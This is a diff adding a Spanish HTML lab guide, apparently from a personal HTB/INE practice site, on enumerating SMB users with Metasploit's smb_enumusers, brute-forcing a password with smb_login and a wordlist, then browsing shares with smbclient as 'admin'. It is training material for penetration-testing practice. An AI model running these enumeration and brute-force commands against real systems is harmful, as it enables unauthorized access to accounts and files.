@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protocolo SMB - Metasploit</title>
+    <meta name="description" content="Guía sobre enumeración y explotación del protocolo SMB (puerto 445) utilizando Metasploit Framework, incluyendo fuerza bruta de credenciales.">
+    <meta name="author" content="José Prados">
+    
+    <link rel="stylesheet" href="style.css"> 
+</head>
+<body>
+
+    <div class="fixed-header-container">
+        <header class="main-header">
+            <h1 class="site-title">Máquinas HTB / INE</h1>
+        </header>
+
+        <nav class="main-nav">
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="conocimientos.html">Mis Conocimientos</a></li>
+                <li><a href="maquinas.html" aria-current="page">Máquinas HTB / INE</a></li>
+                <li><a href="contacto.html">Contacto</a></li>
+            </ul>
+        </nav>
+
+        <hr class="divider">
+    </div>
+
+    <div class="content-wrapper">
+        <main class="maquina-guia">
+            
+            <h2 class="titulo-maquina">Protocolo SMB - Enumeración y Explotación con Metasploit</h2>
+            <p class="texto-maquina">
+                <strong>Resumen:</strong> Esta guía detalla cómo enumerar y explotar el protocolo SMB (puerto 445) utilizando Metasploit Framework para descubrir usuarios y forzar contraseñas.
+            </p>
+
+            <details>
+                <summary style="color: var(--color-oro); cursor: pointer;">ℹ️ Información Preliminar</summary>
+                <p style="margin-top: 10px;">
+                    Para esta guía, asumimos que el protocolo SMB está abierto en el puerto 445 del equipo objetivo.
+                </p>
+            </details>
+
+            <div class="texto-maquina">
+                
+                <h3>1. Preparación de Metasploit</h3>
+                <p>Primero, asegúrate de tener conectividad con el equipo objetivo (ej. <code>ping -c 4 [IP]</code>). Luego, inicia la base de datos de Metasploit:</p>
+                <pre><code>sudo service postgresql start</code></pre>
+                <p>Una vez activada, entra en Metasploit:</p>
+                <pre><code>msfconsole</code></pre>
+
+                <h3>2. Enumeración de Usuarios SMB</h3>
+                <p>Con el puerto 445 abierto y su versión identificada (por ejemplo, con <code>nmap</code>), procedemos a buscar usuarios disponibles en el sistema objetivo. Esto es crucial para identificar posibles cuentas de interés.</p>
+                <p>Utilizaremos el módulo auxiliar <code>smb_enumusers</code>:</p>
+                <pre><code>use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS [IP_DEL_OBJETIVO]
+run</code></pre>
+                <p>Guarda esta información en un archivo de texto por si la necesitas más adelante.</p>
+
+                <h3>3. Fuerza Bruta de Contraseñas (smb_login)</h3>
+                <p>Si descubrimos un usuario interesante (ej. 'admin'), podemos intentar averiguar su contraseña usando el módulo auxiliar <code>smb_login</code> junto con un diccionario.</p>
+                <pre><code>use auxiliary/scanner/smb/smb_login
+set RHOSTS [IP_DEL_OBJETIVO]
+set SMBUser [USUARIO_ENCONTRADO]
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set STOP_ON_SUCCESS true  # Detener la búsqueda en cuanto encuentre el password
+run</code></pre>
+
+                <h3>4. Acceso a Recursos Compartidos (smbclient)</h3>
+                <p>Una vez que tengamos el password, podemos intentar iniciar sesión en el protocolo SMB. Salimos de Metasploit y usamos `smbclient`.</p>
+
+                <h4>4.1. Listar "Shares" Disponibles</h4>
+                <p>Para listar los recursos compartidos (`shares`) disponibles en el servidor como 'admin', ejecuta:</p>
+                <pre><code>smbclient -L \\\\IP_DEL_OBJETIVO\\ -U admin</code></pre>
+                <p>Se te pedirá la contraseña (que ya conoces). Esto te mostrará los directorios compartidos.</p>
+
+                <h4>4.2. Acceder a un "Share" Específico</h4>
+                <p>Para entrar a un recurso compartido específico (ej. "public") como el usuario 'admin', hazlo de la siguiente manera:</p>
+                <pre><code>smbclient \\\\IP_DEL_OBJETIVO\\public -U admin</code></pre>
+                <p>Esto te permitirá navegar dentro del `share` como el usuario especificado.</p>
+                
+                <p>¡Y con esto, ya estaríamos dentro del SMB con credenciales de administrador!</p>
+                
+            </div>
+
+            <p><a href="maquinas.html" style="color: var(--color-oro); text-decoration: none;">← Volver al Índice de Máquinas</a></p>
+        </main>
+    </div>
+
+</body>
+</html>
